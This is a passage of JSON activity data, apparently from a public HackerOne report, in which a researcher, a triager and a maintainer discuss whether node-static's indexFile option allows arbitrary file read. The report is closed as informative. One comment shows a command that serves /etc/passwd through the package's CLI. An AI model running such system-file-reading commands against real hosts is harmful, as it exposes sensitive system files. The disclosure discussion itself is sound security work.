_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5634366,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @bl4de - How can an actual attacker benefit from this behavior? The party running the `./node_modules/node-static/bin/cli.js` already has access to the machine, what prevents them from doing something like the following?\n```\n$ cd /etc\n$ /tmp/node_modules/node-static/bin/cli.js --indexFile passwd -p 8081\nserving \".\" at http://127.0.0.1:8081\n```\n\nRegards,\n@bassguitar ","markdown_message":"\u003cp\u003eHello \u003ca href=\"/bl4de\"\u003e@bl4de\u003c/a\u003e - How can an actual attacker benefit from this behavior? The party running the \u003ccode\u003e./node_modules/node-static/bin/cli.js\u003c/code\u003e already has access to the machine, what prevents them from doing something like the following?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ cd /etc\n$ /tmp/node_modules/node-static/bin/cli.js --indexFile passwd -p 8081\nserving \u0026quot;.\u0026quot; at http://127.0.0.1:8081\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/bassguitar\"\u003e@bassguitar\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-22T08:06:40.899Z","updated_at":"2019-08-22T08:06:40.899Z","actor":{"username":"bassguitar","cleared":false,"url":"/bassguitar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/352/794/5d82b321348f78aa4ac9c82c0bdd004828bcb414_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5635267,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @bassguitar,\n\nThis is actually why I've added this line in vulnerability description:\n\n\u003e If indexFile option can be somehow controlled by malicious user, this can lead to arbitrary file read.\n\nSo yeah, a scenario with CLI is not the good one (let's assume it was only for PoC).\n\nHowever, I still see a danger in `options` passed as an argument when `node-static` accepts user provided input here (see PoC with simple Node.js app) and creates instance(s) based on those options. Then nothing stops an attacker from abusing this particular option to gain arbitrary file read.\n\nCheers,\n\nbl4de\n\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/bassguitar\"\u003e@bassguitar\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThis is actually why I\u0026#39;ve added this line in vulnerability description:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIf indexFile option can be somehow controlled by malicious user, this can lead to arbitrary file read.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eSo yeah, a scenario with CLI is not the good one (let\u0026#39;s assume it was only for PoC).\u003c/p\u003e\n\n\u003cp\u003eHowever, I still see a danger in \u003ccode\u003eoptions\u003c/code\u003e passed as an argument when \u003ccode\u003enode-static\u003c/code\u003e accepts user provided input here (see PoC with simple Node.js app) and creates instance(s) based on those options. Then nothing stops an attacker from abusing this particular option to gain arbitrary file read.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-22T08:28:04.502Z","updated_at":"2019-08-22T08:28:52.248Z","actor":{"username":"bl4de","cleared":false,"url":"/bl4de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5916519,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @bassguitar ,\n\nAny update? :)\nHave you got a chance to discuss this issue with Node.js Ecosystem team?\n\nCheers,\n\nbl4de","markdown_message":"\u003cp\u003eHi \u003ca href=\"/bassguitar\"\u003e@bassguitar\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eAny update? :)\u003cbr\u003e\nHave you got a chance to discuss this issue with Node.js Ecosystem team?\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-29T19:12:13.683Z","updated_at":"2019-09-29T19:12:13.683Z","actor":{"username":"bl4de","cleared":false,"url":"/bl4de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5916964,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @bl4de - We are still looking into this report and will update you when we have additional information to share. Thanks for your patience!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/bl4de\"\u003e@bl4de\u003c/a\u003e - We are still looking into this report and will update you when we have additional information to share. Thanks for your patience!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-30T00:11:08.151Z","updated_at":"2019-09-30T00:11:08.151Z","actor":{"username":"bassguitar","cleared":false,"url":"/bassguitar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/352/794/5d82b321348f78aa4ac9c82c0bdd004828bcb414_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5918031,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @bassguitar ,\n\nOk, thanks for the update.\n\nCheers,\n\nbl4de","markdown_message":"\u003cp\u003eHi \u003ca href=\"/bassguitar\"\u003e@bassguitar\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eOk, thanks for the update.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-30T07:47:54.187Z","updated_at":"2019-09-30T07:47:54.187Z","actor":{"username":"bl4de","cleared":false,"url":"/bl4de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5970159,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bl4de nice seeing you around again :)\n\nSince both configuration options, whether via the CLI or as a config file, are controlled by the user and are supposed to be \"source of truth\" then I don't think this is a vulnerability itself. Regardless, I invited the package maintainer to this issue to see if they'd like to treat it as such or fix the issue altogether.\n\n","markdown_message":"\u003cp\u003e\u003ca href=\"/bl4de\"\u003e@bl4de\u003c/a\u003e nice seeing you around again :)\u003c/p\u003e\n\n\u003cp\u003eSince both configuration options, whether via the CLI or as a config file, are controlled by the user and are supposed to be \u0026quot;source of truth\u0026quot; then I don\u0026#39;t think this is a vulnerability itself. Regardless, I invited the package maintainer to this issue to see if they\u0026#39;d like to treat it as such or fix the issue altogether.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-06T13:04:05.178Z","updated_at":"2019-10-06T13:04:05.178Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6143409,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No response yet from Alexis, trying to reach out to another maintainer to review this report.","markdown_message":"\u003cp\u003eNo response yet from Alexis, trying to reach out to another maintainer to review this report.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-26T09:51:29.331Z","updated_at":"2019-10-26T09:51:29.331Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6143410,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-26T09:52:05.018Z","updated_at":"2019-10-26T09:52:05.018Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6468598,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bl4de I'm going to resolve this one without any further action. Let me know if you however feel different or find another reason for re-opening it. Appreciate your work and effort!","markdown_message":"\u003cp\u003e\u003ca href=\"/bl4de\"\u003e@bl4de\u003c/a\u003e I\u0026#39;m going to resolve this one without any further action. Let me know if you however feel different or find another reason for re-opening it. Appreciate your work and effort!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-04T19:40:18.904Z","updated_at":"2019-12-04T19:40:18.904Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6468603,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-04T19:41:10.710Z","updated_at":"2019-12-04T19:41:10.710Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"Other module","new_scope":"node-static","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6468607,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Informative but doesn't strike me as an overall vulnerability. Will be a good reason for maintainers of this library to include a security disclaimer where relevant.","markdown_message":"\u003cp\u003eInformative but doesn\u0026#39;t strike me as an overall vulnerability. Will be a good reason for maintainers of this library to include a security disclaimer where relevant.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-04T19:42:12.468Z","updated_at":"2019-12-04T19:42:12.468Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6468608,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-04T19:42:19.032Z","updated_at":"2019-12-04T19:42:19.032Z","first_to_agree":true,"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6468609,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-04T19:42:26.017Z","updated_at":"2019-12-04T19:42:26.017Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6468611,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @lirantal ,\n\nSounds good to me, feel free to take any action you need to :)\n\nRegards,\n\nbl4de","markdown_message":"\u003cp\u003eHi \u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eSounds good to me, feel free to take any action you need to :)\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-04T19:42:30.677Z","updated_at":"2019-12-04T19:42:30.677Z","actor":{"username":"bl4de","cleared":false,"url":"/bl4de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}